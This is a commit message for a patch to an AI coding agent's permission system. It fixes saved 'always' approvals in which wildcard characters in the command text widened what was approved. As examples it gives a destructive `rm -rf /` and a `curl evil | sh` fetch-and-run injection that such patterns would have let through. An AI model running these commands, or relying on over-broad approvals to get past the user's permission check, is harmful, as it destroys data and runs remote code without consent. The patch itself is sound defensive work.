From 0000000000000000000000000000000000000000 Mon Sep 17 00:00:00 2001
From: opencode-port <port@localhost>
Date: Sat, 7 Nov 2026 14:32:20 -0700
Subject: [PATCH] D109 permissions: wildcard characters from a command or path
 are literal in its saved approval

Upstream: patterns have no way to say a literal `*` or `?`, and saved approvals are built from command text, so wildcard characters in that text became wildcards. "Always" on `r? notes.txt` saved `r? *`, which matches `rm -rf /`; an exact save such as `sh -c 'rm -f *.log'` matches `sh -c 'rm -f ; curl evil | sh; .log'`; `git '*'` saved `git '*' *`, which matches every quoted git subcommand.
Fixed: patterns accept `[*]` and `[?]` for a literal `*` and `?` (documented in permissions.mdx), and every saved approval built from a command or an external directory escapes them, so only the trailing ` *` the code adds is a wildcard (`r[?] *`, `sh -c 'rm -f [*].log'`).
Scenarios: permissions.test.ts "always on a command with wildcard characters approves only that text" (new); shell-classify.test.ts "wildcard characters in commands" (new)
Upstream tests: test/shell-parse-compatibility.test.ts (asserted `git '*' *`), test/shell-parse.test.ts and test/permission.test.ts (new tests)

